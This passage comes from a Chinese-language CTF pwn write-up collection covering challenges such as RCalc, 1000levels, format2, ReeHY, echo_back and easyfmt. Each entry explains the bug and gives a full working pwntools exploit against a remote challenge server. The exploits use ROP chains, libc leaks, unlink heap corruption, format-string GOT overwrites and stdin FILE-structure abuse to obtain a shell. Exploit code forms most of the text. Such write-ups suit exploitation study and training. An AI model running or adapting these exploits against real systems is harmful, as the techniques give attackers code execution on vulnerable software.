    io = process('./dubblesort', env={"LD_PRELOAD" : "./libc_32.so.6"})
else:
    io = remote('220.249.52.134', 55072)

offset = 0xf7fcc244 - 0xf7e1e000

if __name__ == '__main__':
    # leak
    username = b'A' * 27
    io.sendlineafter(':', username)
    data = io.recvuntil(' sort :')
    print(data)
    addr = u32(data[34:38])
    log.info('leak address: 0x%x' % addr)

    # system, /bin/sh
    libcBase = addr - offset
    log.info('libc base: 0x%x' % libcBase)
    systemAddr = libcBase + libc.sym['system']
    binshAddr = libcBase + next(libc.search(b'/bin/sh\x00'))
    log.info('system: 0x%x' % systemAddr)
    log.info('/bin/sh: 0x%x' % binshAddr)

    # input numbers
    io.sendline('35')
    for i in range(24):
        io.sendlineafter(': ', '1')
    io.sendlineafter(': ', '+')
    for i in range(9):
        io.sendlineafter(': ', str(systemAddr))
    io.sendlineafter(': ', str(binshAddr))
    # gdb.attach(io)
    # pause()
    io.interactive()
```


### 21. RCalc
题目：暂无

思路：通过逆向分析发现再输入名字的时候存在栈溢出，但是这里存在一个手写的canary保护机制。另外在保存结果的时候没有数量限制，会导致堆溢出，可以覆盖保存canary的堆块，从而绕过第一个漏洞点的栈溢出保护，再通过常规的ROP进行利用即可。

#### scanf输入字符串的特性
对于下面的代码，当输入字符串中包含\t,\r,\n时，scanf会中断，但是遇到\x00时会继续输入，输入完成后会在字符串后加0，如果字符串长度为0不会加0。测试发现输入为0x09(\t)-0x0d(\r)（9-13）之间的任意值都会导致输入中断，因此这里进行溢出的时候payload中不能包含这些特殊字符。
```c
char s[128];
scanf("%s", s);
```

#### system("/bin/sh")执行错误？
看了其他的wp，都是通过泄露__lib_start_main函数的地址，然后得到libc中system函数和/bin/sh的地址，最后调用system("/bin/sh")得到flag。但是实际运行发现报错，错误为
```bash
sh: 1: \x8a\xfa\xff: not found
sh: 1: \xff\x10\xfa\xff\xb0a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff\x8a\xfa\xff@\x8a\xfa\xffЈ\xfa\xff\xa8\x89\xfa\xff@\x8a\xfa\xffЈ\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff: not found
Input your name pls: [*] Got EOF while reading in interactive
```
猜测可能是题目给的环境存在点问题，但是既然存在溢出那总是有办法获取到flag的，可以调用/bin/cat flag，最原始的还可以使用open、read系统调用的方式读取flag。这里我用了pppppp和mmmcall方式构造了一段read函数调用，将/bin/cat flag写入到bss段，然后执行system得到flag，这里关键在于read函数的got地址中包含0x20,需要变换之后绕过去。全部源代码如下：
```python
from pwn import *
from LibcSearcher import *

elf = ELF('RCalc')
libc = ELF('libc.so.6')

debug = False
if debug:
    io = process('./RCalc', env={"LD_PRELOAD" : "./libc.so.6"})
else:
    io = remote('220.249.52.134', 58208)

pop_rdi = 0x401123
mainAddr = 0x401036
pppppp = 0x40111A
mmmcall = 0x401100

def passCanary():
    for _ in range(35):
        io.sendlineafter('choice:', '1')
        io.sendlineafter('integer: ', '0')
        io.sendline('0')
        data = io.sendlineafter('result? ', 'yes')
        print(data)
    io.sendlineafter('choice:', '5')

if __name__ == '__main__':
    # leak __libc_start_main
    payload = b'\x00' * 0x110
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(elf.got['__libc_start_main'])
    payload += p64(elf.plt['printf'])
    payload += p64(mainAddr)
    io.sendlineafter('pls: ', payload)
    passCanary()
    data = io.recvuntil('pls: ')
    print(data)
    __libc_start_main = u64(data.split(b'Input')[0].ljust(8, b'\x00'))
    log.success('__libc_start_main: 0x%x' % __libc_start_main)

    # calc system address
    libcBase = __libc_start_main - libc.sym['__libc_start_main']
    systemAddr = libcBase + libc.sym['system']
    readAddr = libcBase + libc.sym['read']
    binshAddr = libcBase + next(libc.search(b'/bin/sh\x00'))
    log.success('system: 0x%x' % systemAddr)
    log.success('read: 0x%x' % readAddr)
    log.success('binsh: 0x%x' % binshAddr)


    # read /bin/sh to bss
    payload = b'\x00' * 0x110
    payload += p64(0)
    # gdb.attach(io, gdbscript='''
    # b *0x401022''')
    # read /bin/ls to bss
    log.info('bss: 0x%x' % elf.bss())
    log.info('bss: 0x%x' % (elf.bss()+0x500))
    payload += p64(pppppp) + p64(0x400) + p64(0x401) + p64(0x600050) + p64(14) + p64(elf.bss() + 0x500) + p64(0) + p64(mmmcall) + b'\x00'*56 + p64(mainAddr)
    io.sendline(payload)
    # pause()
    passCanary()
    io.send(b'/bin/cat flag\x00')
    data = io.recvuntil('pls: ')
    print(data)

    payload = b'\x00' * 0x110
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(elf.bss() + 0x500)
    # payload += p64(binshAddr)
    payload += p64(systemAddr)
    payload += p64(mainAddr)
    io.sendline(payload)

    passCanary()
    io.interactive()
    # data = io.recvuntil('pls: ')
    # print(data)
```


### 22. Aul
题目：暂无

思路：题目只给了一个nc连接地址，输入后会提示可以输入的命令，其中help命令可以得到一个lua字节码文件，保存这个文件以用unluac_2020_05_28.jar反编译，反编译会报错，跟自己手动编译的一个lua字节码文件比较返现头部少了一个字节，增加这个字节以后可以正常反编译，源代码审计发现这个nc连接是一个lua解释器，直接输入lua的命令就可以获取flag， os.execute('cat flag')


### 23. 1000levevls
题目：暂无

思路：漏洞点为常规的栈溢出，难点在于绕过地址随机化，一是利用了栈上残留的system变量，二是利用了vsyscall地址不随机的缺陷，三是利用one_gadget.

题目的溢出点比较常规，没有开启canary等保护机制，但是开启了PIE，由于地址都是随机的，没法直接ROP。本题存在一个特殊的栈变量，hint函数会将system函数的地址放入到栈中ebp+0x110处，而在go函数中这个位置正好存放一个变量，而且这里存在一个漏洞就是输入的level值小于等于0时，这个变量没有赋初值，默认为system的地址，此外在输入any more的时候这个变量会加上一个值，如果这个值为one_gadget和system函数在libc的偏移，那么这个变量中实际的保存的值将会变为one_gadget在内存中的真实地址！这个漏洞需要仔细检查反汇编代码，直接看反编译结果是看不出来的！！！

现在只通过栈溢出将这个值作为返回地址就可以了，但是这个变量的位置在实际返回地址下方24字节，这里可以使用类似nop滑行指令的方式，将溢出函数的返回值指向一个ret指令，这时溢出函数返回时会执行ret，即弹出一个地址，然后继续返回。这个ret指令来自vsyscall段，这个段的地址空间是固定的而不是随机的（某些版本的linux将这个段删除了），因此可以从这里找一个ret指令即可。

one_gadget的安装使用如下：
```bash
sudo gem install one_gadget
one_gadget libc.so
```

全部利用源代码如下：
```python
from pwn import *

debug = False
if debug:
    io = process('100levels')
else:
    io = remote('220.249.52.134', 52998)

libc = ELF('libc.so')
system_addr = libc.sym['system']
exec_gadget = 0x4526a
offset_address = exec_gadget - system_addr
vsyscall = 0xffffffffff600000

if __name__ == '__main__':
    # 先执行hint将system地址放入栈中
    data = io.sendlineafter('Choice:\n', '2')
    print(data)
    data = io.sendlineafter('Choice:\n', '1')
    print(data)
    # 输入的level<=0, level变量不会被初始化，而使用了栈上残留的system地址
    data = io.sendlineafter('?\n', '0')
    print(data)
    # any more输入，这个值会加到level变量，此时level变量中保存的是one_gadget实际在内存中的地址
    data = io.sendlineafter('?\n', str(offset_address))
    print(data)
    for _ in range(99):
        # 这里利用溢出覆盖了下一个变量（程序计算结果）为0，输入的值也为0，因此结果始终正确
        data = io.sendlineafter('Answer:', p64(0) * 5)
        print(data)
    # 覆盖到rbp，然后从返回地址开始覆盖了3个ret指令的地址，执行完3个ret后会跳转到one_gadget
    data = io.sendafter('Answer:', b'a' * 0x38 + p64(vsyscall) * 3)
    print(data)
    io.interactive()
```

### 24. format2
题目：暂无

思路：通过栈溢出覆盖ebp从而劫持控制流。

存在漏洞的函数是auth，memcpy将base64解码后的数据（最长为12字节）复制到临时变量（大小为8字节），会导致栈溢出，但是由于长度限制只能覆盖到ebp。另外，通过checksec查看存在canary保护，但是查看auth的汇编代码发现并没有，这主要是因为这个程序使用了静态编译，库函数开启了canary机制导致checksec的分析受到了干扰。

#### 通过ebp控制程序流的原理
一般退出函数都是执行一下两条指令
```
leave
ret
# 等效于
mov esp, ebp
pop ebp
ret
```
内层函数退出时，如果可以覆盖栈帧中的ebp（恶意值为X）。
1. 内层函数退出时: esp = ebp，ebp = X.
2. 外层函数退出时: esp = X, ebp = [X], ret = [X+4]，从而控制了返回地址

全部源代码如下：
```python
from pwn import *
import base64

debug = False
if debug:
    io = process('./a')
else:
    io = remote('220.249.52.134', 56892)

shell_addr = 0x08049284
input_addr = 0x0811EB40

if __name__ == '__main__':
    # 覆盖ebp为input_addr - 4
    # input_addr前4个字节为getshell的地址
    # ret = [X+4] = [input_addr - 4 + 4] = [input_addr] = getshell_addr
    payload = p32(shell_addr) + b'xxxx' + p32(input_addr - 4)
    payload = base64.b64encode(payload)
    io.sendlineafter(': ', payload)

    io.interactive()
```

### 25. 4-ReeHY-main-100
题目：暂无

思路：通过整数溢出进而进行栈溢出；堆溢出。

#### 整数溢出
```c++
int sub_4009D1()
{
  int result; // eax
  char buf; // [rsp+0h] [rbp-90h]
  void *dest; // [rsp+80h] [rbp-10h]
  int v3; // [rsp+88h] [rbp-8h]
  size_t nbytes; // [rsp+8Ch] [rbp-4h]

  result = dword_6020AC;
  if ( dword_6020AC <= 4 )
  {
    puts("Input size");
    result = sub_400C55("Input size");
    LODWORD(nbytes) = result;
    if ( result <= 4096 )
    {
      puts("Input cun");
      result = sub_400C55("Input cun");
      v3 = result;
      if ( result <= 4 )
      {
        dest = malloc((signed int)nbytes);
        puts("Input content");
        // 比较大小用的是有符号数，读取数据用的是无符号数
        // 如果nbytes为-1，将会进入下面的分析，read再执行时会造成buf溢出
        if ( (signed int)nbytes > 112 )
        {
          read(0, dest, (unsigned int)nbytes);
        }
        else
        {
          read(0, &buf, (unsigned int)nbytes);
          memcpy(dest, &buf, (signed int)nbytes);
        }
        *(_DWORD *)(qword_6020C0 + 4LL * v3) = nbytes;
        *((_QWORD *)&unk_6020E0 + 2 * v3) = dest;
        dword_6020E8[4 * v3] = 1;
        ++dword_6020AC;
        result = fflush(stdout);
      }
    }
  }
  return result;
}
```

全部利用代码如下：
```python
from pwn import *
from LibcSearcher import *

context.arch = 'amd64'
elf = ELF('./4-ReeHY-main')
libc = ELF('./ctflibc.so.6')

main_addr = 0x400C8C
pop_rdi = 0x400da3
# 通过题目给的libc搜索到的one_gadget没法用，可能不是正确的libc
# 而是通过libsearcher找到数据库中对应的so文件，然后再使用one_gadget搜索得到正确的地址
one_gadget = 0x45216

debug = False
if debug:
    io = process('./4-ReeHY-main')
else:
    io = remote('220.249.52.134', 43553)

def create(index, size, content):
    data = io.sendlineafter('$ ', '1')
    print(data)
    data = io.sendlineafter('\n', '%d' % size)
    print(data)
    data = io.sendlineafter('\n', '%d' % index)
    print(data)
    data = io.sendlineafter('\n', content)
    print(data)

if __name__ == '__main__':
    io.sendlineafter('$ ', '1')
    payload = b'\x00' * 0x90 + b'A' * 8 + p64(pop_rdi) + p64(elf.got['puts']) + \
            p64(elf.plt['puts']) + p64(main_addr)
    create(1, -1, payload)
    put_addr = u64(io.recv(6).ljust(8, b'\x00'))
    log.success('put address: 0x%x' % put_addr)
    log.info('puts: 0x%x' % libc.sym['puts'])
    libc = LibcSearcher('puts', put_addr)
    log.info('puts: 0x%x' % libc.dump('puts'))
    libc_base = put_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    binsh_addr = libc_base + libc.dump('str_bin_sh')

    io.sendlineafter('$ ', '1')
    # 可以使用system("/bin/sh")或者one_gadget的方式获取shell
    payload = b'\x00' * 0x98 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
    payload = b'\x00' * 0x98 + p64(one_gadget + libc_base) + b'\x00'*0x100
    create(1, -1, payload)
    io.interactive()
```

#### unlink漏洞
这个题目的另一解法是利用堆块释放时unlink操作实现任意地址写入，利用的前提是可以修改堆块头部，由于在写入堆块前会检查长度，没法直接堆溢出，但是程序在删除堆块的时候使用有符号数，没有考虑负数的情况，因此可以释放掉保存堆块长度的chunk，利用fastbin的特性可以重新申请回来，然后就可以修改堆场长度进行堆溢出了。
```c++
__int64 sub_400B21()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Chose one to dele");
  result = sub_400C55("Chose one to dele");
  v1 = result;
  if ( (signed int)result <= 4 )
  {
    free(*((void **)&unk_6020E0 + 2 * (signed int)result));
    dword_6020E8[4 * v1] = 0;
    puts("dele success!");
    result = (unsigned int)(dword_6020AC-- - 1);
  }
  return result;
}
```

首先需要绕过unlink时的检测操作。
```python
# 假设原始堆块为P
P-> prev_size
    size
    data
#全部变量X中保存P->data

# 在堆块内构造一个伪造的空闲堆块，并覆盖下一个堆块的头
P-> prev_size
    size
fake_P->fake_pre_size: 0
        fake_size: size - 0x10
        fake_fd
        fake_bk
```

释放下一个堆块时，发现上面响铃的伪造空闲堆块fake_P，于是发生合并,合并前会检测:
```python
fake_P->fake_fd->bk == fake_P
fake_P->fake_bk->fd == fake_P
```

这就需要构造fake_fd和fake_bk, 使得
```python
*(fake_fd+0x18) = *(fake_bk+0x10) = fake_P = P->data = *X
即fake_fd+0x18 = fake_bk+0x10 = X
fake_fd = X - 0x18, fake_bk = X - 0x10
```
在本题中，如果使用第0个堆块作为unlink对象，那么X对应bss段的地址为0x6020E0，因此
```python
fake_fd = 0x6020E0 - 0x18 = 0x6020C8
fake_bk = 0x6020E0 - 0x10 = 0x6020D0
```

unlink操作实现任意地址写入。unlink操作实际上就是双链表删除节点的操作
```python
# 当前节点为P
# 找到前后两个节点
FD = P->fd
BK = P->bk
# 修改前面节点的后向指针
FD->bk = BK
# 修改后面节点的前向指针
BK->fd = FD
```
对应到伪造的节点，unlink执行了下面的操作
```python
FD = fake_P->fd = 0x6020C8
BK = fake_P->bk = 0x6020D0
FD->bk = *(0x6020E0) = 0x6020D0
BK->fd = *(0x6020E0) = 0x6020C8
```
最终本来写入第0个堆块地址的变量X被写入了一个X前面的bss段地址，这时候写入第0个堆块实际上就是修改bss段的数据了，进一步修改第0个堆块地址为某个函数的got地址，再写入第0个堆块就是修改got表的内容了，从而实现任意地址写入。

全部利用源代码如下：
```python
from pwn import *
from LibcSearcher import *

context.arch = 'amd64'
elf = ELF('./4-ReeHY-main')
libc = ELF('./ctflibc.so.6')

debug = False
if debug:
    io = process('./4-ReeHY-main')
else:
    io = remote('220.249.52.134', 43553)

def create(index, size, content):
    data = io.sendlineafter('$ ', '1')
    print(data)
    data = io.sendlineafter('\n', '%d' % size)
    print(data)
    data = io.sendlineafter('\n', '%d' % index)
    print(data)
    data = io.sendafter('\n', content)
    print(data)

def edit(index, content):
    data = io.sendlineafter('$ ', '3')
    print(data)
    data = io.sendlineafter('\n', '%d' % index)
    print(data)
    data = io.sendafter('\n', content)
    print(data)

def delete(index):
    data = io.sendlineafter('$ ', '2')
    print(data)
    data = io.sendlineafter('\n', '%d' % index)
    print(data)

chunk0_ptr = 0x6020e0

if __name__ == '__main__':
    io.sendlineafter('$ ', '1')
    # create two chunk for merge
    create(0, 0x100, '1')
    create(1, 0x100, '1')
    # delete byteArr chunk
    delete(-2)
    # gdb.attach(io)
    # pause()
    # using fastbin to get last chunk
    # set chunk0 chunk1 size
    payload = p32(0x200) + p32(0x200)
    create(2, 0x10, payload)
    # overflow chunk0
    # 1. prev_size size
    payload = p64(0) + p64(0x101)
    # 2. fd bk
    payload += p64(chunk0_ptr - 0x18) + p64(chunk0_ptr - 0x10)
    # 3. padding
    payload += b'\x00' * (0x100 - 0x20)
    # 4. next prev_size next size
    payload += p64(0x100) + p64(0x110)
    edit(0, payload)
    # gdb.attach(io)
    # pause()
    # delete chunk1 will trigger chunk merge
    delete(1)
    # gdb.attach(io)
    # pause()
    # now *chunk0_ptr = 0x6020c8
    # edit chunkArr
    payload = b'A' * 0x18
    payload += p64(elf.got['free']) + p64(1)
    payload += p64(elf.got['puts']) + p64(1)
    payload += p64(elf.got['atoi']) + p64(1)
    edit(0, payload)
    # gdb.attach(io)
    # pause()
    # now *chunk0_ptr = elf.got['free']
    # *chunk1_ptr = elf.got['puts']
    # hijack free with puts
    payload = p64(elf.plt['puts'])
    edit(0, payload)
    # gdb.attach(io)
    # pause()
    # call free(chunk1) => puts(elf.got['puts'])
    delete(1)
    # gdb.attach(io)
    # pause()
    data = io.recv(6)
    print(data)
    puts_addr = u64(data.ljust(8, b'\x00'))
    libc = LibcSearcher('puts', puts_addr)
    log.info('puts: 0x%x' % libc.dump('puts'))
    libc_base = puts_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    # hijack atoi with system
    edit(2, p64(system_addr))
    io.sendlineafter('$ ', '/bin/sh')
    io.interactive()
```


### 26. echo_back
题目：暂无

思路：这个题目的漏洞点还是比较明显的，就是存在一个printf格式化字符串漏洞，可以比较轻易泄露地址信息，但是难点在于这个可控的字符串存在7个字符的长度限制，不好直接利用漏洞修改返回地址，这里利用了修改_IO_2_1_stdin_结构，然后利用scanf实现任意地址写入的方法从而getshell。

#### printf格式化字符串漏洞泄露信息
由于这个题所有防护机制全开，因此如果需求修改返回地址并进行rop需要得到elf文件和libc的基址以及栈的地址，这里通过格式化字符串漏洞泄露相关信息。格式化字符串漏洞利用主要就是需要确定printf函数调用时的堆栈内容，一种是通过ida分析，另一种是在gdb中直接在printf那一行上下断点。栈帧如下：
```
rsp --> xx
        name_addr
        xx
        x length
        content
        cookie
    |---ebp
    |   ret(main函数中的某个地址)
    |   xx
    |   xx
    |   name
    |   cookie
    |--> ebp
        ret(__lib_start_main中的某个地址)
```
由于64位传参首先使用前6个寄存器，第一个寄存器是format字符串，后面5个寄存器依次为format的前5个参数，从栈顶开始依次是第6、到第n个参数。为了泄露我们需要的信息，我们使用%12$p,%13$p,%19$p分别泄露main函数的栈帧（上面个ebp，将这个值+8得到main函数返回地址的地址）、第一个返回地址（用于计算elf的基址）、第二个返回地址（用于计算libc基址）。
**如果加载的libc不是题目给定的libc会导致泄漏的地址有偏差。**

#### printf格式化字符串漏洞写入
格式化字符串漏洞向某个地址写入内容时还需要提供地址信息，如果直接写入肯定超过7个字符限制了，这里可以使用name写入地址信息节省字符串长度。但是由于长度限制，%16$hhn只能往name指向的地址中写入一个字节0.

#### 修改_IO_2_1_stdin_结构实现scanf任意写入
_IO_2_1_stdin_结构体：
```c++
struct _IO_FILE
{
    int _flags; /* High-order word is _IO_MAGIC; rest is flags. */

    /* The following pointers correspond to the C++ streambuf protocol. */
    char *_IO_read_ptr;  /* Current read pointer */
    char *_IO_read_end;  /* End of get area. */
    char *_IO_read_base; /* Start of putback+get area. */
    char *_IO_write_base;/* Start of put area. */
    char *_IO_write_ptr; /* Current put pointer. */
    char *_IO_write_end; /* End of put area. */
    char *_IO_buf_base;  /* Start of reserve area. */
    char *_IO_buf_end;   /* End of reserve area. */
    ...
}
```
当程序调用scanf读取内容时会根据_IO_read_ptr和_IO_read_end从_IO_buf_base中读取内容，如果缓冲区都读完了会使用系统调用从标准输入中读取内容并写入到_IO_buf_base中并设置_IO_read_ptr和_IO_read_end。如果能够修改_IO_buf_base和_IO_buf_end就能实现任意地址写入了。这里修改_IO_2_1_stdin_结构体使用了格式化字符串漏洞，首先将_IO_buf_base的低字节修改为0。查看stdin结构在内存中的状态：
```python
pwndbg> x/20x stdin
0x7ffff7dd18e0 <_IO_2_1_stdin_>:        0xfbad208b      0x00000000      0xf7dd1964      0x00007fff
0x7ffff7dd18f0 <_IO_2_1_stdin_+16>:     0xf7dd1964      0x00007fff      0xf7dd1963      0x00007fff
0x7ffff7dd1900 <_IO_2_1_stdin_+32>:     0xf7dd1963      0x00007fff      0xf7dd1963      0x00007fff
0x7ffff7dd1910 <_IO_2_1_stdin_+48>:     0xf7dd1963      0x00007fff      0xf7dd1963      0x00007fff
0x7ffff7dd1920 <_IO_2_1_stdin_+64>:     0xf7dd1964      0x00007fff      0x00000000      0x00000000
```
由于地址随机化不影响最低的一个字节，因此最低位在libc不变的情况下固定的，因此将_IO_buf_base的低字节修改为0后实际指向了_IO_write_base字段，由于_IO_buf_end没变，这时候scanf就可以输入很长的内容了。这时候调用scanf就可以修改新的_IO_buf_base指向的内存了，输入的内容首先要覆盖3个write字段（默认就是stdin的地址+0x83）,然后_IO_buf_base和_IO_buf_end为需要写入的内存地址范围，_IO_buf_end可以比较大。这里还有个问题就是scanf首先确实进行了系统调用并将内存写入到指定的位置了，但是由于这里是scanf("%d",&len),而输入的内容中并没有数字字符，因此_IO_read_ptr并没有移动，因此无法进行下一次系统调用写入新的数据了，这里存在一个利用条件就是scanf之后调用了一个getchar函数，将_IO_read_ptr指针+1，多次调用使得_IO_read_ptr==_IO_read_end之后会再次出发系统调用从而往我们需要的地址写入数据了。

全部利用代码如下：
```python
from pwn import *

debug = False
if debug:
    io = process('./echo_back')
else:
    io = remote('220.249.52.134', 51753)

elf = ELF('echo_back')
libc = ELF('libc.so.6')

def echo(payload, length=b'100\n'):
    data = io.sendlineafter('>> ', '2')
    print('1',data)
    data = io.sendafter(':', length)
    print('2',data)
    io.send(payload)
    data = io.recvuntil('say:')
    print('3',data)
    data = io.recvuntil('----')
    print('4',data)
    return data[:-4]

def set_name(name):
    io.sendlineafter('>> ', '1')
    io.sendafter(':', name)

pop_rdi = 0xd93

if __name__ == '__main__':
    # leak libc addr
    payload = b'%19$p'
    data = echo(payload)
    libc_start_main = int(data[2:], 16) - 240
    libc_addr = libc_start_main - libc.sym['__libc_start_main']
    log.success('libc addr: 0x%x' % libc_addr)

    system_addr = libc_addr + libc.sym['system']
    binsh_addr = libc_addr + next(libc.search(b'/bin/sh\x00'))
    log.success('system addr: 0x%x' % system_addr)
    log.success('binsh addr: 0x%x' % binsh_addr)

    # leak main ebp
    payload = b'%12$p'
    data = echo(payload)
    main_ebp = int(data[2:], 16)
    main_ret_addr = main_ebp + 8
    log.success('main ret addr: 0x%x' % main_ret_addr)

    # leak main addr
    payload = b'%13$p'
    data = echo(payload)
    main_addr = int(data[2:], 16)
    log.success('main addr: 0x%x' % main_addr)
    elf_base = main_addr - 0xd08
    log.success('elf base: 0x%x' % elf_base)
    # gdb.attach(io)
    # pause()

    # modify _IO_2_1_stdin_ io_buf_base0 low byte to 00(_io_buf_base1)
    stdin = libc.sym['_IO_2_1_stdin_'] + libc_addr
    stdin_buf_base = stdin + 0x8 * 7
    set_name(p64(stdin_buf_base))
    payload = b'%16$hhn'
    # gdb.attach(io)
    # pause()
    echo(payload)
    # now stdin_buf_base = stdin + 0x20

    # using scanf to  modify stdin
    # _io_write_base, _io_write_ptr, _io_write_end, _io_buf_base2, _io_buf_end
    length = p64(stdin+0x83)*3+p64(main_ret_addr)+p64(main_ret_addr+48)
    echo('a', length)
    # gdb.attach(io)
    # pause()
    # now _io_buf_base2 -> main_ret_addr
    # _io_read_ptr = _io_buf_base1 + 1
    # _io_read_ptr + 1 because of getchar()
    # _io_read_end = _io_buf_base1 + len(length)

    # using getchar to make _io_read_ptr = _io_read_end
    for i in range(len(length) - 1):
        print(i)
        echo('xx', 'xx')
    # gdb.attach(io)
    # pause()

    # scanf will trigger read stdin
    # length = p64(0x45216 + libc_addr)
    log.success('one_gadget addr: 0x%x' % (0x45216 + libc_addr))
    # length = p64(0x45216 + libc_addr)
    length = p64(pop_rdi + elf_base) + p64(binsh_addr) + p64(system_addr)
    echo('a', length)
    # gdb.attach(io)
    # pause()

    # exit
    io.sendlineafter('>> ', '3')
    io.interactive()
```

### 27. HMI流水灯运行
题目：小D在一套HMI人机接口的流水灯中，发现它的接口存在一定的问题，需要我们去查找它的漏洞。

思路：简单的栈溢出。

这里主要存在一个问题就是什么时候发送payload，程序在等待输入前会额外发送一个换行符，因此只要接收到两个换行符就可以输入了。另外一个坑就是程序会不停止输出，直接cat flag，输出结果会被冲掉，可以使用cat flag & cat flag多输出一行。

全部利用代码如下：
```python
from pwn import *
from LibcSearcher import *

debug = False
if debug:
    io = process('./format')
else:
    io = remote('220.249.52.134', 50761)

elf = ELF('format')
libc = ELF('libc_32.so.6')

system_addr = libc.sym['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))

if __name__ == '__main__':
    # ROP
    payload = b'A' * 0x8c
    payload += p32(elf.plt['puts']) + p32(elf.sym['gee']) + p32(elf.got['puts'])
    io.sendlineafter('\n\n', payload)
    data = io.recv(4)
    print(data)
    puts_addr = u32(data)
    libc_addr = puts_addr - libc.sym['puts']
    log.success('libc addr: 0x%x' % libc_addr)

    system_addr = libc_addr + libc.sym['system']
    binsh_addr = libc_addr + next(libc.search(b'/bin/sh\x00'))

    payload = b'A' * 0x8c
    payload += p32(system_addr) + b'A' * 4 + p32(binsh_addr)
    io.sendline(payload)
    io.interactive()
```

### 28. easyfmt
题目：暂无

思路：简单的格式化字符串漏洞。

程序首先会提示输入一个值，然后跟一个随机数比较，如果相等可以进入printf逻辑，由于这个随机数是单字节数，直接爆破就可以了。

printf这里利用方法首先是通过gdb或者ida确定printf调用时栈内容，可以发现字符串的初始位置为第8个参数（前5个参数为寄存器）。
```python
pwndbg> stack 30
00:0000│ rsp      0x7ffe5dff46e0 —▸ 0x7ffe5dff48f8 —▸ 0x7ffe5dff6534 ◂— 0x4c45485300612f2e /* './a' */
01:0008│          0x7ffe5dff46e8 ◂— 0x100000000
02:0010│ rdi rsi  0x7ffe5dff46f0 ◂— 0x3125633433343225 ('%2434c%1')
03:0018│          0x7ffe5dff46f8 ◂— 0x2a2a2a2a6e682430 ('0$hn****')
04:0020│          0x7ffe5dff4700 —▸ 0x601060 (exit@got.plt) —▸ 0x400726 (exit@plt+6) ◂— push   9 /* 'h\t' */
05:0028│          0x7ffe5dff4708 ◂— 0xa /* '\n' */
06:0030│          0x7ffe5dff4710 ◂— 0x0
```

下一步通过```%x$hn```修改got.exit为main函数中的进入printf那一段逻辑，使得程序调用exit后能够继续运行，这里可以直接逐字节修改，这样payload比较多，通过gdb调试发现got.exit默认值为0x400726,这样只需要修改低位两个字节就可以了。
```python
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 11
 
[0x601018] puts@GLIBC_2.2.5 -> 0x7ffff7e64550 (puts) ◂— push   r14
[0x601020] write@GLIBC_2.2.5 -> 0x4006a6 (write@plt+6) ◂— push   1
[0x601028] __stack_chk_fail@GLIBC_2.4 -> 0x4006b6 (__stack_chk_fail@plt+6) ◂— push   2
[0x601030] printf@GLIBC_2.2.5 -> 0x7ffff7e44c50 (printf) ◂— sub    rsp, 0xd8
[0x601038] read@GLIBC_2.2.5 -> 0x7ffff7edcde0 (read) ◂— mov    eax, dword ptr fs:[0x18]
[0x601040] __libc_start_main@GLIBC_2.2.5 -> 0x7ffff7e14be0 (__libc_start_main) ◂— push   r15
[0x601048] srand@GLIBC_2.2.5 -> 0x7ffff7e2cfd0 (srandom) ◂— push   rbp
[0x601050] time@GLIBC_2.2.5 -> 0x7ffff7fd0a50 (time) ◂— cmp    dword ptr [rip - 0x49d3], -1
[0x601058] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e64c30 (setvbuf) ◂— push   r14
[0x601060] exit@GLIBC_2.2.5 -> 0x400726 (exit@plt+6) ◂— push   9 /* 'h\t' */
[0x601068] rand@GLIBC_2.2.5 -> 0x7ffff7e2d6f0 (rand) ◂— sub    rsp, 8
```

再通过```%x$s```泄露某个函数的地址，并计算出system函数地址。这里存在几个坑：一是本地调试时使用了kali自带的libc库，导致泄漏出来的函数在LibSearcher中找不到，后面这里通过远程泄漏确定库版本；二是泄漏某些函数不一定能定位到libc库版本，可以换几个其他的函数试一试。

最后通过```%x$hn```修改got.printf为system函数地址，然后调用printf("/bin/sh") getshell。这里有两个技巧：一是printf和system函数地址高字节相同，只需要修改低位4个字节即可；二是不要直接使用`%x$n`直接写4个字节内容，这样需要打印的填充字符串太多导致网络传输很慢，可以拆分成两个`%x$hn`，可以节省需要打印的填充字符串。

全部利用代码如下：
```python
from pwn import *
from LibcSearcher import *

debug = True
if debug:
    io = process('./a')
else:
    io = remote('220.249.52.134', 30856)

elf = ELF('a')

def check_in():
    global io
    while True:
        io.sendlineafter(':', '0')
        ret = io.recv()
        if b'bye' in ret:
            io.close()
            if debug:
                io = process('./a')
            else:
                io = remote('220.249.52.134', 30856)
        else:
            print(ret)
            break

if __name__ == '__main__':
    # brute check in
    check_in()
    # gdb.attach(io)
    # pause()

    # modify got.exit to loop
    # got.exit init value is 0x400726, only need to modify 0726
    # loop_addr = 0x400982
    # index = 8
    payload = b'%2434c%10$hn****' + p64(elf.got['exit'])
    print(payload)
    io.sendline(payload)
    ret = io.recvuntil(b'slogan:')
    print(ret)

    # leak puts
    # index = 9 because of call exit push a rip into stack
    payload = b'%10$s***' + p64(elf.got['read'])
    print(payload)
    io.sendline(payload)
    ret = io.recvuntil(b'slogan:')
    print(ret)
    puts_addr = u64(ret[2:8] + b'\x00\x00')
    log.success('puts addr: 0x%x' % puts_addr)
    libc = LibcSearcher('read', puts_addr)
    libc_addr = puts_addr - libc.dump('read')

    # modify got.printf to system
    # index = 10
    system_addr = libc_addr + libc.dump('system')
    # system_addr = 0x123456
    system_addr_1 = (system_addr & 0xffff0000) >> 16
    system_addr_2 = (system_addr & 0xffff)
    if system_addr_1 > system_addr_2:
        payload = b'%%%dc%%14$hn%%%dc%%15$hn' % (system_addr_2, system_addr_1 -
                system_addr_2)
        payload = payload.ljust(32, b' ')
        payload += p64(elf.got['printf']) + p64(elf.got['printf'] + 2)
    else:
        payload = b'%%%dc%%14$hn%%%dc%%15$hn' % (system_addr_1, system_addr_2 -
                system_addr_1)
        payload = payload.ljust(32, b' ')
        payload += p64(elf.got['printf'] + 2) + p64(elf.got['printf'])
    print(payload)
    io.sendline(payload)
